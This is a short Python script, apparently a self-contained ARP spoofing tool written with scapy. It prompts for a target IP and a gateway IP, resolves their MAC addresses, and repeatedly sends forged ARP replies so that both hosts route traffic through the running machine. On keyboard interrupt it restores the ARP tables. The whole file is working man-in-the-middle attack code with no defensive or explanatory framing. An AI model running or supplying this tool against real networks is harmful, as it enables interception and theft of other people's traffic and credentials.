

import scapy.all as scapy
import time



# network scanner
def getmac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request

    answered_list=scapy.srp(arp_request_broadcast ,timeout=1 , verbose=False)[0]

    return answered_list[0][1].hwsrc

# mac sppofer
def spoof(target_ip,spoof_ip):

    target_mac=getmac(target_ip)


    packets=scapy.ARP(op=(2), pdst=target_ip , hwdst=target_mac , psrc=spoof_ip)
    scapy.send(packets ,verbose=False)


# restoring arp table to default

def restore(dest_ip,src_ip):
    dest_mac=getmac(dest_ip)
    src_mac=getmac(src_ip)
    packets=scapy.ARP(op=2, pdst=dest_ip , hwdst=dest_mac ,psrc=src_ip ,hwsrc=src_mac)
    scapy.send(packets ,count=4 , verbose=False)


# print(packets.show())
# print(packets.summary())

target_ip=input("Enter target IP:")
gateway_ip=input("Enter gateway IP:")


try:
    snt_pkt_cnt = 0

    while True:
        # spoofing client
        spoof(target_ip , gateway_ip)
        # sppofing gateway
        spoof(gateway_ip, target_ip)
        snt_pkt_cnt = snt_pkt_cnt + 2
        # dynamic linking with end
        print("\r [+] packet sent :" + str(snt_pkt_cnt), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] restoring arp table")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)